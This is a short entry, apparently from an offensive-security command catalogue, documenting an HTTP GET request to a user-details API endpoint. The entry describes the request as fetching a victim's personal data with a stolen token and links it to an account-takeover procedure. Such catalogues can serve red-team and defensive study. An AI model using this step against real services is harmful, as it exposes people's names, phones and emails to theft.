---
data: GET /v2/userdetails.json/<USERID> HTTP/1.1
tags:
  - api-query
  - pii-leakage
type: command
executor: http
platforms:
  - Web
id: 33f4d8d1-ff8c-4c9a-813a-7b80143f90af
created_at: '2025-12-13T09:01:26.134Z'
updated_at: '2025-12-13T09:01:26.134Z'
verified: false
validated: true
submitted: true
---
# GET User Details

## Command

```http
GET /v2/userdetails.json/<USERID> HTTP/1.1
```

## Description

Fetches victim's PII using stolen token and UserID.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<USERID>` | Victim's UserID | Yes |

## Examples

### Basic Usage

```http
GET /v2/userdetails.json/12345 HTTP/1.1
```

## Expected Output

JSON with name, phone, email, etc.

## Related

- [[procedures/Perform-Account-Takeover-with-Stolen-Tokens]]
